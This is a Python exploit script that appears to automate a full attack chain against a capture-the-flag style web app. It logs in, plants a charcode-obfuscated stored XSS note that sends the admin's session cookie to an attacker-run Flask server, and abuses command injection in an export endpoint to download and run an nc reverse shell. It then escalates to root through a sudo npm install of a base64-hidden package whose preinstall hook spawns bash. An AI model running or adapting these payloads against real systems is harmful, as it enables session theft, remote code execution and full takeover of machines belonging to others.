#!/usr/bin/python3
import argparse, base64, click, logging, contextlib, flask, ipaddress, re, requests, socket, sys, threading, time

#Parse command line arguments
parser = argparse.ArgumentParser()
parser.add_argument('RHOST',help='Remote host')
parser.add_argument('RPORT',help='Remote port')
parser.add_argument('LHOST',help='Local IP address for reverse shell payload')
parser.add_argument('LPORT',help='Local port for reverse shell payload')
args = parser.parse_args()

LHOST = args.LHOST
LPORT = args.LPORT
RHOST = args.RHOST
RPORT = args.RPORT
URLBASE = "http://"+RHOST+":"+RPORT+"/"

#Initialize thread locks
wsLock = threading.Lock()
wsLock.acquire()
rsLock = threading.Lock()
rsLock.acquire()

#Send a login request
data = {"username":"RickA","password":"nevergonnagiveyouup"}
headers = {"User-Agent":"Linux"}
r = requests.post(URLBASE+"login", data=data, headers=headers, allow_redirects=False)
cookie = r.headers['set-cookie']

#Get the session cookie from the response
m = re.search("connect\.sid=(.*?);",cookie)
cookieName = "connect.sid"
cookieValue = m.group(1)

#Send a request for the /agent page to get a booking ID
headers['Cookie'] = cookieName+"="+cookieValue
proxies = {"http":"http://127.0.0.1:8080"}
r = requests.get(URLBASE+"agent", headers=headers, proxies=proxies)
m = re.search("""href=\"/vac/([0-9,a-z,\-]*?)\">""",r.text)
bookingID = m.group(1)

#Initialize web server files
XJS = '''req1 = new XMLHttpRequest();
req1.open("GET","http://localhost:8000/vac/''' + bookingID + '''",false);
req1.send();
req2 = new XMLHttpRequest();
req2.open("GET","http://''' + LHOST + '''/leak?x="+btoa(req1.responseText),false);
req2.send();
'''

RS = '''#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ''' + LHOST + " " + LPORT + " >/tmp/f"

#Configure a flask web server
app = flask.Flask("Evil web server")

@app.route('/x.js', methods=['GET'])
def xjs():
    print("[*] Sending JavaScript to leak the admin session cookie")
    return flask.Response(XJS, mimetype='application/javascript')

@app.route('/rs', methods=['GET'])
def rs():
    print("[*] Sending reverse shell payload")
    return flask.Response(RS, mimetype='application/octet-stream')

@app.route('/leak', methods=['GET'])
def leak():
    global cookieValue, wsLock
    b = base64.b64decode(flask.request.url.split("leak?x=")[1])
    m = re.search("""name=\"cookie\" value=\"connect.sid&#x3D;(.*?)\">""",str(b)) #Search base64 decoded string
    cookieValue = m.group(1)
    print("[*] Admin session cookie leaked: " + cookieValue)

    #Let the main thread know that we have succesfully captured the admin session cookie
    wsLock.release()

    return flask.Response("OK")

def startFlask():
    app.run(host=LHOST, port=80)

#Start the web server to serve x.js and leak the admin's session cookie. We use the 'logging' and 'click' module to make it silent
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
click.echo = lambda a, *args, **styles : None
click.secho = lambda a, *args, **styles : None
thread2 = threading.Thread(target=startFlask)
thread2.start()

#Send an evil note that will request x.js from the web server
print("[*] Sending XSS payload")
payload = """document.write('<script src="http://"""+LHOST+"""/x.js"></script>')"""
nums = [str(ord(i)) for i in payload]
payload = '<img src="x/><script>eval(String.fromCharCode('+','.join(nums)+'));</script>">'
data = {"uuid":bookingID,"body":payload}
r = requests.post(URLBASE+"agent/addNote", headers=headers, data=data)

#Wait for the admin session cookie before proceeding
print("[*] Waiting for the admin user to visit the infected note")
wsLock.acquire()
headers['Cookie'] = cookieName+"="+cookieValue

# executeRevShell - Executes a reverse shell on the target by abusing the command injection vulnerability
# Params:
#   urlbase - The URL of the target to compromise
#   wsIP - IP of the webserver which hosts the reverse shell payload "rs"
#   mutex - A mutex to acquire before exploiting the target
#   headers - Headers to send with the command injection attempts
def executeRevShell(urlbase, wsIP, mutex, headers):
    if mutex!=None:
        mutex.acquire()

    #convert Ip to dec format
    ipDec = int(ipaddress.ip_address(wsIP))

    print("[*] Instructing the target to download and execute the reverse shell payload")
    with contextlib.suppress(requests.exceptions.ReadTimeout):
        requests.get(urlbase+"admin/export?table=x%20rm%20rs", headers=headers)
        requests.get(urlbase+"admin/export?table=x%26wget%20"+str(ipDec)+"%2frs", headers=headers)
        requests.get(urlbase+"admin/export?table=x%26bash%20rs", headers=headers, timeout=0.5)

#listener - Creates a listener which can catch a reverse shell
#Params:
#   ip - IP address to listen on
#   port - Port to listen on
#   lock(opt) - A mutex to release after binding to the specified ip and port
#   commands(opt) - Commands to execute before creating an interactive shell
def listener(ip,port,mutex=None,commands=[]):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("[*] Listening on port " + str(port))
    if mutex != None:
        mutex.release()

    conn, addr = s.accept()
    print('[*] Connection received from ',addr)
    defaultSleepTime = 1 #Time to wait for command output before returning, Measured in seconds
    sleepTime = defaultSleepTime
    while True:

        #Receive data from the target and execute commands
        ans = conn.recv(1024).decode()
        if commands:
            command = commands[0]
            commands = commands[1:]
            if not commands: #If this command is the last command
                sleepTime = 5 #Wait 5 seconds to ensure that all commands have been fully exectued before getting their output
        else:
            sys.stdout.write(ans)
            command = input()
            #Remove the output of the "input()" function
            sys.stdout.write("\033[A\033[F"+ans.split("\n")[-1])

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(sleepTime) #Wait a second before retreiving the output of the command
        sleepTime = defaultSleepTime

#Create a thread that waits for a listener to start and then executes the reverse shell payload
thread3 = threading.Thread(target=executeRevShell,args=(URLBASE,LHOST,rsLock,headers))
thread3.start()

#Prepare a list with privesc commands and start a listener
#cat package.json | base64 -w 0
packageJSON = "ewogICJuYW1lIjogInByaXZlc2NQYWNrYWdlIiwKICAidmVyc2lvbiI6ICIxLjAuMCIsCiAgIm1haW4iOiAiaW5kZXguanMiLAogICJzY3JpcHRzIjogewogICAgInByZWluc3RhbGwiOiAiL2Jpbi9iYXNoIC1pIgogIH0KfQo="
privescCommands = ["mkdir ./privescPackage","echo '" + packageJSON + "' | base64 -d > privescPackage/package.json","sudo npm i privescPackage --unsafe"]
listener(LHOST,int(LPORT),mutex=rsLock,commands=privescCommands)
